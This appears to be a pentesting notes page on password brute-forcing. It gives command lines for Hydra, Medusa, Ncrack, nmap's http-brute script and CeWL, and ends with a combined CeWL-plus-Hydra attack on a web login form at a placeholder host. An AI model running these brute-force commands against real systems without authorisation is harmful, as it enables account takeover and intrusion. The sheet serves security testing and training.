## Bruteforcing

### Hydra
- [Hydra](tools/hydra.md) (in this Repo)
- can also crack webforms
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt
# -l : username
# -P : password list
```

### Medusa
- can Bruteforce different services
- smb, ssh, ftp, pop3, http, ms-sql
```bash
medusa -h
# -h : help
```

### Ncrack
- very fast
- multiple services
```bash
ncrack -h
# -h : help
```

### nmap
```bash
nmap --script http-brute -p 80 192.254.1.1  -vvv # bruteforce script trys to brute force automatically
```

### Burpsuite
- can be used to bruteforce webforms with intruder
- is quite slow in community edition

### Wordlists
- /usr/share/wordlists/rockyou.txt


#### CEWL 
- can be used to create custom wordlists
- scrape a website for words

```bash
# scrape a website for words
cewl -d 1 -m 5 -w wordlist.txt http://example.com
#-w : result file wordlist
```

## Example combined

```bash
# scrape a website for words
cewl -d 1 -m 5 -w wordlist.txt http://example.com
#-w : result file wordlist

hydra -l user -P wordlist.txt http://example.com -V http-post-form "/login.php:username=^USER^&password=^PASS^:F=ERROR"
```